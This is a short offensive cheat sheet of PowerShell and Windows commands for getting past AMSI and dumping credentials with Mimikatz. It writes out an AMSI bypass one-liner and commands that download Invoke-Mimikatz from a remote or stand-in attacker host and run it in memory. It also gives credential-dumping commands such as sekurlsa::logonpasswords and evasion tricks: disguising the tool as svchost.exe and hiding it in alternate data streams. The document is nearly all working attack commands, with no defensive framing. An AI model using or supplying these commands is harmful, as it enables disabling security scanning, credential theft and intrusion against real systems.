Bypassing AMSI
# PowerShell bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or use Invoke-Mimikatz (PowerShell version)
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

Using Invoke-Mimikatz (Less Detection)

# Download and run from memory
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Customized execution
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit"

Obfuscation Techniques

# Rename mimikatz.exe
rename mimikatz.exe svchost.exe

# Use alternate data streams
type mimikatz.exe > "C:\Windows\Tasks\svc.exe:min"
wmic process call create "C:\Windows\Tasks\svc.exe:min"

# Split into parts and reassemble
# Use base64 encoding

